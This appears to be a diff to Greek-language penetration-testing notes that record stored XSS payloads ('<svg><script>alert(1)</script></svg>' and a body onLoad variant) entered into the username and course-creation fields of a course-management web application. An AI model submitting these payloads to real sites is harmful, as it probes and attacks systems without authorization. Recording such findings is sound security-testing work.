@@ -50,3 +50,30 @@ Email/ονομα/επώνυμο
 Ονομα Χρήστη:
 TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 ------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+----> Drunkadmin <----
+
+-Δημιουργία μαθήματος
+---> Τίτλος
+	<svg xmlns="#"><script>alert(1)</script></svg>
+---> Εκπαιδευτές
+	<svg xmlns="#"><script>alert(1)</script></svg>	
+---> Περιγραφή
+	<svg xmlns="#"><script>alert(1)</script></svg>
+---> Λέξεις Κλειδιά
+	<svg xmlns="#"><script>alert(1)</script></svg>-->
+	<body onLoad="alert('1');"
+---> Συμπληρωματικά Στοιχεία
+	<svg xmlns="#"><script>alert(1)</script></svg>
+
+--------------------------------------------------------------------------------------------------------
